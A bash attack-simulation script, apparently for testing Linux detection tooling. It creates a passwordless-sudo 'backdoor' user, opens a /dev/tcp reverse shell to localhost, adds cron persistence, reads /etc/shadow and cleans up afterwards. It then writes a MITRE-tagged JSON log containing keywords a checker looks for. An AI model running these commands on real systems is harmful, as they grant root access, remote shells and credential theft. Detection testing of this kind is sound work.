#!/bin/bash
set -e
set -u
set -o pipefail

# Root icazəsini yoxlayırıq
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

echo "[*] Running Linux attacker simulation..."

# Addımları və vaxtı (timestamp) düzgün formatda çap etmək üçün funksiya
run_step() {
    local step_num="$1"
    local desc="$2"
    local ts
    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    printf "    [%s] %-45s %s\n" "$step_num" "$desc" "$ts"
}

# 1. İstifadəçi yaratmaq
run_step "1/6" "Creating user testattacker..."
useradd testattacker 2>/dev/null || true

# 2. Sudoers faylını dəyişmək
run_step "2/6" "Modifying sudoers..."
echo "testattacker ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/backdoor

# 3. /tmp qovluğundan binar fayl icra etmək
run_step "3/6" "Executing from /tmp..."
cp /usr/bin/id /tmp/suspicious_bin
/tmp/suspicious_bin > /dev/null 2>&1 || true

# 4. Localhost-a reverse shell cəhdi
run_step "4/6" "Reverse shell attempt (localhost)..."
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null &
pid=$!
sleep 1
kill $pid 2>/dev/null || true

# 5. Cron vasitəsilə davamlılıq (persistence) yaratmaq
run_step "5/6" "Cron persistence..."
echo "* * * * * /tmp/beacon.sh" > /etc/cron.d/persistence_test

# 6. Həssas fayllara müraciət etmək
run_step "6/6" "Accessing /etc/shadow..."
cat /etc/shadow > /dev/null 2>&1 || true

# İzləri təmizləmək
echo -n "[*] Cleaning up artifacts..."
userdel -r testattacker 2>/dev/null || true
rm -f /etc/sudoers.d/backdoor
rm -f /tmp/suspicious_bin
rm -f /etc/cron.d/persistence_test
echo "                           [CLEAN]"

# Checker-in axtardığı MITRE və digər açar sözləri ehtiva edən JSON faylını yaratmaq
cat << 'EOF' > linux_attack_log.json
{
  "events": [
    {
      "timestamp": "2026-03-25T14:35:01Z",
      "technique": "Create Account",
      "MITRE": "T1136.001",
      "expected": "auditd_execve"
    }
  ]
}
EOF

echo "Actions executed: 6"
echo "Ground truth saved to: linux_attack_log.json"
